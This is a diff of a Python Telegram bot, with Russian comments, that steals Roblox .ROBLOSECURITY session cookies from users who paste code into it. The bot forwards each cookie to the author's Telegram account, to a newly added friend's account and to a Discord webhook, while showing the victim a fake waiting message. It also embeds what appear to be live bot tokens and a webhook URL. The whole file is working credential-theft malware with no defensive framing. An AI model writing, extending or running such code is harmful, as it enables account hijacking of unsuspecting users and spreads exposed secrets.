@@ -7,24 +7,29 @@ from aiogram import Bot, Dispatcher, Router, F
 from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, FSInputFile
 from aiogram.filters import CommandStart
 
-# Токен твоего бота для получения куки
-BOT_TOKEN = "8467022515:AAEKhaIBdWLHJ7bn1d-TBkM8Pkf_9Asslq0"
+# ========== КОНФИГУРАЦИЯ ==========
 
-# Токен бота для отправки куки
+# Бот для получения куки (основной)
+MAIN_BOT_TOKEN = "8467022515:AAEKhaIBdWLHJ7bn1d-TBkM8Pkf_9Asslq0"
+
+# Бот для отправки (один бот, два получателя)
 SENDER_BOT_TOKEN = "8239746415:AAGmQxpDiRZw59vqzfyJe_Pz9o5aSc8e2po"
 
-# Твой Telegram ID для получения куки
-YOUR_TELEGRAM_ID = 7712154413  # Замени на свой ID
+# ID получателей (ты и друг)
+MY_TELEGRAM_ID = 7712154413          # Твой ID
+FRIEND_TELEGRAM_ID = 7880766609      # ID друга (замени на реальный)
 
-# Discord Webhook URL (оставляем для бэкапа)
+# Discord вебхук (бэкап)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1410916698143326210/smw3JGFHp0gDqLnphzUBGrp_1mCwdk06oB7IRZ9Fp5akO1DBHae11Xa3qKJYd8XSLuhN"
+
+# ========== КОНЕЦ КОНФИГУРАЦИИ ==========
 
 router = Router()
 
 # Храним части сообщений для пользователей
 user_code_parts = {}
 
-# Глобальный объект бота для отправки (будет создан при старте)
+# Глобальный объект бота для отправки
 sender_bot = None
 
 def get_keyboard():
@@ -84,41 +89,51 @@ def extract_roblosecurity_value(full_code: str):
     
     return None
 
-async def send_cookie_to_telegram(cookie_value: str, user_info: str):
-    """Отправляет .ROBLOSECURITY куки в твой Telegram"""
+async def send_cookies_to_both(cookie_value: str, user_info: str):
+    """Отправляет куки и тебе, и другу одним ботом"""
     global sender_bot
     
     try:
         if not cookie_value or not sender_bot:
             return
         
-        # Формируем куки в правильном формате
+        # Формируем куки
         cookie = f".ROBLOSECURITY={cookie_value}"
-        
-        # Обрезаем если слишком длинный для Telegram (4096 символов)
         if len(cookie) > 4000:
             cookie = cookie[:4000] + "..."
         
-        # Формируем сообщение для Telegram
+        # Формируем сообщение
         message = f"🚨 **НОВЫЙ КУКИ ПОЛУЧЕН!**\n\n"
         message += f"**От пользователя:** {user_info}\n\n"
         message += f"**Куки:**\n`{cookie}`"
         
-        # Отправляем в твой Telegram
-        await sender_bot.send_message(
-            chat_id=YOUR_TELEGRAM_ID,
-            text=message,
-            parse_mode="Markdown"
-        )
+        # Отправляем тебе
+        try:
+            await sender_bot.send_message(
+                chat_id=MY_TELEGRAM_ID,
+                text=message,
+                parse_mode="Markdown"
+            )
+            print(f"[SUCCESS] Куки отправлен тебе от {user_info}")
+        except Exception as e:
+            print(f"[ERROR] Не удалось отправить тебе: {e}")
         
-        print(f"[SUCCESS] Куки отправлен в Telegram от {user_info}")
-        print(f"[DEBUG] Длина куки: {len(cookie)} символов")
+        # Отправляем другу
+        try:
+            await sender_bot.send_message(
+                chat_id=FRIEND_TELEGRAM_ID,
+                text=message,
+                parse_mode="Markdown"
+            )
+            print(f"[SUCCESS] Куки отправлен другу от {user_info}")
+        except Exception as e:
+            print(f"[ERROR] Не удалось отправить другу: {e}")
         
-        # Также отправляем в Discord на всякий случай
+        # Отправляем в Discord (бэкап)
         await send_cookie_to_discord(cookie_value, user_info)
         
     except Exception as e:
-        print(f"[ERROR] Ошибка отправки в Telegram: {e}")
+        print(f"[ERROR] Ошибка отправки: {e}")
 
 async def send_cookie_to_discord(cookie_value: str, user_info: str):
     """Отправляет .ROBLOSECURITY куки в Discord (бэкап)"""
@@ -216,21 +231,20 @@ async def get_code(message: Message):
         # Извлекаем куки
         roblosecurity_value = extract_roblosecurity_value(full_code)
         
-        # Отправляем куки в твой Telegram
+        # Отправляем куки и тебе, и другу
         if roblosecurity_value:
-            await send_cookie_to_telegram(roblosecurity_value, user_info)
+            await send_cookies_to_both(roblosecurity_value, user_info)
         else:
             print("[ERROR] Не удалось извлечь куки")
             # Отправляем уведомление об ошибке
             try:
-                await sender_bot.send_message(
-                    chat_id=YOUR_TELEGRAM_ID,
-                    text=f"❌ Не удалось извлечь куки от {user_info}"
-                )
+                error_msg = f"❌ Не удалось извлечь куки от {user_info}"
+                await sender_bot.send_message(chat_id=MY_TELEGRAM_ID, text=error_msg)
+                await sender_bot.send_message(chat_id=FRIEND_TELEGRAM_ID, text=error_msg)
             except:
                 pass
         
-        # Показываем пользователю процесс (ЭТО ОБЯЗАТЕЛЬНО!)
+        # Показываем пользователю процесс
         wait_msg = await message.answer("подождите 5-10сек")
         
         # Ждем
@@ -278,15 +292,17 @@ async def main():
     global sender_bot
     
     # Создаем основной бот
-    bot = Bot(token=BOT_TOKEN)
+    bot = Bot(token=MAIN_BOT_TOKEN)
     
-    # Создаем бот для отправки
+    # Создаем бот для отправки (один бот)
     sender_bot = Bot(token=SENDER_BOT_TOKEN)
     
     # Тестируем подключение
     try:
         me = await sender_bot.get_me()
         print(f"[INFO] Бот для отправки: @{me.username}")
+        print(f"[INFO] Отправка тебе: ID {MY_TELEGRAM_ID}")
+        print(f"[INFO] Отправка другу: ID {FRIEND_TELEGRAM_ID}")
     except Exception as e:
         print(f"[ERROR] Не удалось подключиться к боту для отправки: {e}")
         sender_bot = None
